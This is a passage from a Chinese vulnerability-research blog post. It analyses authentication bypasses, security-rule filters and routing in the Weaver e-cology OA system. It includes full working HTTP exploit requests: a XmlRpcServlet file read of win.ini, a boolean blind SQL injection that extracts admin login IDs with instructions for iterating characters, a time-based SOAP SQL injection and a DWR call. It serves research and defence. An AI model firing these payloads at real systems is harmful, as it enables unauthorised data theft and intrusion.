+<p>跟进isLogin：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778476759151-3819923a-54c0-453e-bda9-c6ab3a3a8576.png"  alt="img"></p>
+<p>第一种，可以在这个if时不进入，就直接返回true了。</p>
+<p>isLoginCheck控制不了：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778476936418-5bd15d48-63a0-4352-8894-f6b133c7c896.png"  alt="img"></p>
+<p>isCheckCookieIpUrl：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778476959507-f4894d65-3057-4d6d-9d86-9c8459c64744.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778476981684-fe472713-0fc4-4f20-b317-fcfaf85f5f75.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778477002308-fb011134-e50f-4da5-9b83-039990201278.png"  alt="img"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(\.gif|\.jpg|\.jpeg|\.png|\.js|\.css|\.html|\.htm|\.swf|\.cur|\.flv|\.avi|\.wma|\.wmv|\.mp3|\.mp4|\.3gp|\.zip|\.rar|\.rtf|\.doc|\.ico|\.exe|\.msi|\.xml|\.map)$</span><br></pre></td></tr></table></figure>
+
+<p>所以只要URL出现这些字段，就可以直接返回true。</p>
+<p>这里直接试试.js吧，目标是只要进到doGet就成功：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778477964377-f2411f85-08e7-4f09-a579-5e67f19e2b34.png"  alt="img"></p>
+<p>然而，被安全策略拦截了。</p>
+<p>还是一样的调试策略，一直打断点，直到断不下来，通过二分去快速定位到是在哪里跳出的，定位到：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778478067797-311c73a9-62f9-428e-9017-c16e78eba453.png"  alt="img"></p>
+<p>能发现，如果这里判断是静态文件（path结尾为.jsp等），且路径中以&#x2F;api&#x2F;开头，或有messageservlet，或有&#x2F;weaver&#x2F;，或有weaver. 都会导致进入errorRedirect。这其实不算严格意思上的安全策略，只是单独做了一个全局的判断。这也回答了上一节最后的问题，因为jsp也在列表中（真的是这个原因吗？）。</p>
+<p>但是，process方法里的静态文件列表，和刚刚看的isLogin里的是有区别的，比如.mp4，就不存在于process里，但存在于isLogin里，所以可以通过.mp4访问到doGet：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778478273507-8a65a2aa-2311-48d1-af77-e6cac2fe1a07.png"  alt="img"></p>
+<p>上面讲的只是isLogin中的一种绕过。而原poc是在这里绕过的：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778478316191-0846de5e-78c1-48e3-8bbf-9b961e6d28ad.png"  alt="img"></p>
+<p>只要path里有login，就返回true。</p>
+<p>其他的方法可以问AI，或者遇到在看：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778478426069-826b153b-27a1-41e9-9bcd-5b583215cb64.png"  alt="img"></p>
+<h2 id="安全策略生效点一"><a href="#安全策略生效点一" class="headerlink" title="安全策略生效点一"></a>安全策略生效点一</h2><p>不过这里其实还有一个问题，为什么&#x2F;weaver&#x2F;weaver.email.FileDownloadLocation&#x2F;login&#x2F;LoginSSO.jsp&#x2F;111不行？按照上面的分析，process里的静态文件判定只看路径末尾是不是.jsp之类的，再加一个理论上应该能通过，进而访问到doGet才对，然而实际情况不是这样的：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778479408047-af3355e9-dc4e-4a19-b306-f22edfbdbf1e.png"  alt="img"></p>
+<p>依旧被安全策略拦截，而且断点没到静态文件判断那里。</p>
+<p>所以肯定是在process的更前面被拦截了。最终发现是在这里：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778479531042-733494e5-943e-4b39-96b6-da10ff8a04c6.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778479852026-0ff5433f-51b7-45e3-a9c0-0c9eb5b81da5.png"  alt="img"></p>
+<p>这里前面会做一些固定规则的校验，在weaver.security.rules.ruleImp.SecurityRuleFileAlaPoc#validate会拦截上面的请求：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778479906381-a4963eef-22a1-43b2-8eb0-a0b90b120223.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778479917104-a20ce86d-ce3a-4908-b130-2ea12417ea32.png"  alt="img"></p>
+<p>这里如果.jsp后面还有&#x2F;，就会拦截。这就是为什么.jsp&#x2F;111到不了doGet的原因。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1、XssRequestWeblogic会通过getParameter对参数做全局过滤</p>
+<p>2、isLogin方法得绕过返回true</p>
+<p>3、this.executeCustomRules会生效部分安全策略</p>
+<p>4、&#x2F;weaver&#x2F;* 的路由逻辑</p>
+<h1 id="XmlRpcServlet文件读取"><a href="#XmlRpcServlet文件读取" class="headerlink" title="XmlRpcServlet文件读取"></a>XmlRpcServlet文件读取</h1><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36618918/article/details/135104295" >https://blog.csdn.net/qq_36618918/article/details/135104295<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>218</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">methodName</span>&gt;</span>WorkflowService.getAttachment<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">params</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">param</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>c://windows/win.ini<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>也是一个&#x2F;weaver路由的漏洞，但是已经修复了，看看怎么修复的。</p>
+<p>能发现是从这里跳出的：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778481142907-5ce79c4e-8c92-4204-9f17-ddd0378e5dff.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778481192007-75ad4a02-15b8-4153-bcc0-fc5ec223eb6c.png"  alt="img"></p>
+<p>这里的165，实际对应的就是\WEB-INF\myclasses\weaver\security\rules\ruleImp里的165个.class文件：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778481255502-43b09baa-d1dd-4474-ab60-e4bb9772b2ff.png"  alt="img"></p>
+<p>我们知道最后肯定返回false，所以直接在下面打断点：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778481318434-2c89c28a-d155-4ca7-a8d9-c311e04aa622.png"  alt="img"></p>
+<p>再返回去看是哪条规则：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778481350244-7528706b-8b1d-43c1-b584-fbd9fb0fc6a0.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778481641133-b95ead2c-a28e-4bc6-a97c-c42f12e71a04.png"  alt="img"></p>
+<p>weaver.security.rules.ruleImp.SecurityRuleHttpServlet#validate会判断调用的类是否是weaver包里的，不是就判断为攻击。所以所有第三方包里的servlet类都用不了了。</p>
+<p>process里的sc.executeCustomRules，实际上就是第二个安全策略生效点。</p>
+<p>安全策略生效点主要就是上面讲的那两个。</p>
+<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>1、process方法里的sc.executeCustomRules为第二处安全策略生效点，会遍历\WEB-INF\myclasses\weaver\security\rules\ruleImp里的所有类的validate方法。</p>
+<h1 id="api-doc-out-more-list-SQL注入"><a href="#api-doc-out-more-list-SQL注入" class="headerlink" title="&#x2F;api&#x2F;doc&#x2F;out&#x2F;more&#x2F;list SQL注入"></a><strong>&#x2F;api&#x2F;doc&#x2F;out&#x2F;more&#x2F;list SQL注入</strong></h1><p>从这个漏洞来看一下&#x2F;api&#x2F;*接口的路由逻辑。</p>
+<p>&#x2F;api&#x2F;*系列接口，\WEB-INF\Api.xls里有接口和类方法的对应表，但是并不完整。比如这个漏洞的接口就没有，所以还是需要自己把\classbean\com去jadx反编译，然后搜索。</p>
+<p>其实我一开始并没有去看&#x2F;api接口的鉴权类，直到复现其他api接口的漏洞，发现无法触发方法时，才想到去web.xml里看是不是有api接口专属的filter做鉴权。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/doc/out/more/list?isNew=1&amp;elementmore=%7B%22srcType%22%3A%20%222%22%2C%20%22srcContent%22%3A%20%22%2A%2F%3D%28%28-1%22%2C%20%22perpage%22%3A%20%2210%22%7D&amp;docarchivedatefrom=a%27OR-1%2F%2Aa&amp;doccreatedatefrom=%2A%2F%3D%28%2F%2Aa&amp;doclastmoddatefrom=%2A%2FSELECT-3%2Blocate%2F%2A&amp;docarchivedateto=%2A%2F%28hex%28SUBSTRING%28%2F%2A&amp;doccreatedateto=%2A%2Floginid%2C1%2C1%29%29%2C%27073%27%29%20%2F%2A&amp;doclastmoddateto=%2A%2Ffrom%20HrmResourceManager%20limit%200%2C1%29%20OR-1%2F%2A</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8060</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br></pre></td></tr></table></figure>
+
+<p>记录返回包中的sessionKey：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778485678381-3a02a5e5-6731-4f69-b77b-4a372652ff6f.png"  alt="img"></p>
+<p>带着sessionKey再去发包，响应中的count大于0即盲注成功。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/ec/dev/table/counts</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8060</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">dataKey</span>=<span class="number">628</span>a12ff-<span class="number">5528</span>-<span class="number">46</span>d7-<span class="number">9092</span>-<span class="number">0</span>deee8460e88_6FEEFE091B16AD0A942D78E12C136D76</span></span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778485722981-56047cc6-61f6-4384-9a37-dbc3e4d574f0.png"  alt="img"></p>
+<p>要注入下一个字符或注入的字段，改doccreatedateto参数</p>
+<p>doccreatedateto&#x3D;<em>&#x2F;loginid,1,1)),’073’) &#x2F;</em></p>
+<p>要改注入的表，改doclastmoddateto参数</p>
+<p>doclastmoddateto&#x3D;<em>&#x2F;from HrmResourceManager limit 0,1) OR-1&#x2F;</em></p>
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞整体流程比较复杂，只简单讲一下。</p>
+<p>com.api.doc.search.web.DocOutMoreAction#getDataList：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778486551364-861975f0-0f3c-4fee-8130-1676533fc7ee.png"  alt="img"></p>
+<p>DocListUtil会对传入的各个参数进行提取并拼接成sqlwhere，getMoreList会进一步拼接sql语句，最终产生一个xml模板，并与sessionKey关联。</p>
+<p>这里会形成好sql语句。接下来是找地方触发，就是第二个请求包。</p>
+<p>这里直接贴出最后执行的语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span>  t1.id,t1.id docstatus_id,t1.seccategory,t1.docvestin,t1.doclastmoddate,t1.doclastmodtime,t1.docsubject,t1.docextendname,t1.doccreaterid,t1.secretLevel,t1.usertype,t1.ownerid,t1.docstatus,t1.doccreatedate,t1.doccreatetime,t1.accessorycount,t1.replaydoccount,t1.sumDownload,t1.sumReadCount,t1.sumMark,t1.docpubdate,t1.docpubtime,t1.docapprovedate,t1.docapprovetime  <span class="keyword">from</span> DocDetail t1  <span class="keyword">where</span> docarchivedate<span class="operator">&gt;=</span><span class="string">&#x27;a&#x27;</span><span class="keyword">OR</span><span class="number">-1</span><span class="comment">/*a&#x27; and doccreatedate &gt;= &#x27;*/</span><span class="operator">=</span>(<span class="comment">/*a&#x27;  and doclastmoddate &gt;= &#x27;*/</span><span class="keyword">SELECT</span><span class="number">-3</span><span class="operator">+</span>locate<span class="comment">/*&#x27;  and docarchivedate&lt;=&#x27;*/</span>(hex(<span class="built_in">SUBSTRING</span>(<span class="comment">/*&#x27; and doccreatedate &lt;= &#x27;*/</span>loginid,<span class="number">1</span>,<span class="number">1</span>)),<span class="string">&#x27;073&#x27;</span>) <span class="comment">/*&#x27; and doclastmoddate &lt;= &#x27;*/</span><span class="keyword">from</span> HrmResourceManager limit <span class="number">0</span>,<span class="number">1</span>) <span class="keyword">OR</span><span class="number">-1</span><span class="comment">/*&#x27; and t1.docstatus in(1,2,5)  and (t1.ishistory is null or t1.ishistory = 0) and (t1.isreply is null or t1.isreply=&#x27;&#x27; or t1.isreply=&#x27;0&#x27;) and (t1.seccategory in (*/</span><span class="operator">=</span>((<span class="number">-1</span>)) <span class="keyword">and</span> t1.docpublishtype<span class="operator">=</span><span class="string">&#x27;2&#x27;</span>  ) `list`</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778487182163-ca348e2e-2f66-4c9e-8656-2905a54db016.png"  alt="img"></p>
+<p>这里能看出就是通过or去做一个布尔盲注，当loginid字段的第一个字符的hex为0x73时，or后面条件成立，就能正常返回数据，count就是大于零的。</p>
+<p>具体比较复杂，自己也没看太懂，大家可以自行分析。</p>
+<h2 id="SessionFilter"><a href="#SessionFilter" class="headerlink" title="SessionFilter"></a>SessionFilter</h2><p>看一下web.xml：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778482004582-734ac0e4-ffe5-47d9-ae2c-4a2e532ed203.png"  alt="img"></p>
+<p>com.cloudstore.dev.api.service.SessionFilter会拦截所有&#x2F;api&#x2F;*</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778487386373-47fae2ec-c986-4823-ad63-944316cd2aa0.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778487421123-9321f311-70a9-4b92-94e9-4d1d236ab43f.png"  alt="img"></p>
+<p>在未登录的情况下，主要根据checkUrl、uncheckUrl、uncheckSessionUrl进行判断。</p>
+<p>这三个变量的初始化：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778487612392-c76f9ad4-23a0-45e7-a909-b0b3b18bf679.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778487622757-4af355d6-485c-479a-9bce-1700ea61d7fc.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778487667714-ab8116cd-c6d9-46a8-b4d1-a11723b5e3e4.png"  alt="img"></p>
+<p>注意，这里weaver.general.BaseBean#getPropValue，都是从WEB-INF&#x2F;prop下直接取对应文件。</p>
+<p>所以，只有uncheck系列的接口是前台攻击面。</p>
+<h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p>1、&#x2F;api&#x2F;*需要注意SessionFilter，放行白名单在&#x2F;prop配置文件中</p>
+<p>2、&#x2F;api&#x2F;*对应的class在&#x2F;classbean&#x2F;com中，WEB-INF&#x2F;Api.xls中有部分的对应关系</p>
+<h1 id="services-WorkPlanService-SQL注入"><a href="#services-WorkPlanService-SQL注入" class="headerlink" title="&#x2F;services&#x2F;WorkPlanService SQL注入"></a>&#x2F;services&#x2F;WorkPlanService SQL注入</h1><p>这是一个&#x2F;services接口的漏洞。</p>
+<p>这里需要先行了解一下WSDL和SOAP的知识，可以看：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/l4BH7B7pHl1HIi4vJYeOUQ" >https://mp.weixin.qq.com/s/l4BH7B7pHl1HIi4vJYeOUQ<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/services/WorkPlanService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8060</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml;charset=UTF-8</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>436</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:web</span>=<span class="string">&quot;webservices.workplan.weaver.com.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">web:deleteWorkPlan</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="comment">&lt;!--type: string--&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="tag">&lt;<span class="name">web:in0</span>&gt;</span>(SELECT 8544 FROM (SELECT(SLEEP(5-(IF(27=27,0,5)))))NZeo)<span class="tag">&lt;/<span class="name">web:in0</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="comment">&lt;!--type: int--&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="tag">&lt;<span class="name">web:in1</span>&gt;</span>22<span class="tag">&lt;/<span class="name">web:in1</span>&gt;</span> </span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">web:deleteWorkPlan</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这里推荐用yakit，bp发包我遇到了问题：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778487861106-ffcb4677-31c4-4128-844a-2f8b317c4e0e.png"  alt="img"></p>
+<p>这里漏洞比较简单，对应weaver.WorkPlan.webservices.WorkplanServiceImpl#deleteWorkPlan，就不分析了。</p>
+<h2 id="webservice接口分析"><a href="#webservice接口分析" class="headerlink" title="webservice接口分析"></a>webservice接口分析</h2><p>说在开头，webservice服务默认情况下只能内网访问：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778488197662-3df4c570-f6f3-4367-bb14-29cff14c67bc.png"  alt="img"></p>
+<p>默认是开启安全验证的，而且不会配置白名单。</p>
+<p>可以通过&#x2F;services?wsdl直接列出所有的可用服务：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778487943362-1f9fc7e8-0980-4015-b98c-d90b92452020.png"  alt="img"></p>
+<p>也可以去\classbean\META-INF\xfire\services.xml里看。</p>
+<p>services相关接口主要受安全策略影响，具体情况具体分析即可。</p>
+<h2 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h2><p>1、&#x2F;services接口的服务类，在\classbean\META-INF\xfire\services.xml中查看</p>
+<p>2、&#x2F;services接口默认只能内网访问</p>
+<h1 id="dwr-call-plaincall-前台绕过"><a href="#dwr-call-plaincall-前台绕过" class="headerlink" title="&#x2F;dwr&#x2F;call&#x2F;plaincall&#x2F; 前台绕过"></a>&#x2F;dwr&#x2F;call&#x2F;plaincall&#x2F; 前台绕过</h1><p>这个漏洞的全利用过程很复杂，大家可以直接看前人的文章：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18849" >https://xz.aliyun.com/news/18849<i class="fas fa-external-link-alt"></i></a></p>
+<p>这里只选择第一步分析，主要目标是看&#x2F;dwr&#x2F;*这类接口的路由逻辑。</p>
+<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/dwr/call/plaincall/WorkflowSubwfSetUtil.LoadTemplateProp.dwr</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8060</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>148</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">batchId</span>=a</span></span><br><span class="line"><span class="language-ini"><span class="attr">c0-id</span>=<span class="number">1</span></span></span><br><span class="line"><span class="language-ini"><span class="attr">c0-methodName</span>=LoadTemplateProp</span></span><br><span class="line"><span class="language-ini"><span class="attr">c0-param0</span>=string:mobilemode</span></span><br><span class="line"><span class="language-ini"><span class="attr">c0-scriptName</span>=WorkflowSubwfSetUtil</span></span><br><span class="line"><span class="language-ini"><span class="attr">callCount</span>=<span class="number">1</span></span></span><br><span class="line"><span class="language-ini"><span class="attr">scriptSessionId</span>=<span class="number">1</span></span></span><br><span class="line"><span class="language-ini"><span class="attr">page</span>=/cpt/xxx.jsp</span></span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778488639279-3280cbb9-bfdb-4f8d-84e6-72927ed476b0.png"  alt="img"></p>
+<p>这里的重点是，Content-Type: text&#x2F;plain。</p>
+<p>c0-scriptName&#x3D;WorkflowSubwfSetUtil为要调用的类，c0-methodName&#x3D;LoadTemplateProp为调用的方法，c0-param0&#x3D;string:mobilemode为参数。</p>
+<p>所以这个包的作用就是调用WorkflowSubwfSetUtil#LoadTemplateProp，实则调用父类的LoadTemplateProp方法。</p>
+<h2 id="dwr-路由逻辑分析"><a href="#dwr-路由逻辑分析" class="headerlink" title="&#x2F;dwr&#x2F;*路由逻辑分析"></a>&#x2F;dwr&#x2F;*路由逻辑分析</h2><p>这里的思路是直接在WorkflowSubwfSetUtil#LoadTemplateProp，然后往前看调用栈。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778489166935-2a6748d4-20b2-453b-80f6-73a3d02f04b1.png"  alt="img"></p>
+<p>看到DwrServlet处理，就想到应该是web.xml里配的规则：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778489218309-c27afedc-d5ac-404c-9009-6198c318ff34.png"  alt="img"></p>
+<p>继续往后看调用栈：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778489359504-658063a8-d3d7-48ac-adf4-910e0cc06c0c.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778489385650-a70307ce-08fc-4a67-9015-6bd584bbbe8c.png"  alt="img"></p>
+<p>calls里已经解析出对应的method了，所以应该去看前面marshaller的部分，这样才能知道能够调用哪些方法。</p>
